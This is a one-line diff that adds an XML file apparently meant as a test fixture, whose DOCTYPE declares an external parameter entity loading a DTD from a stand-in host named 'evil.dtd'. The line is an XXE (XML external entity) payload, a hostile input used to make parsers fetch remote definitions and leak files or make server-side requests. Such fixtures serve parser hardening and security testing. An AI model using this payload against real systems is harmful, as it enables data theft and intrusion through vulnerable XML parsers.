@@ -1,0 +1,1 @@
+<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://example.invalid/evil.dtd">%remote;]><x>local</x>
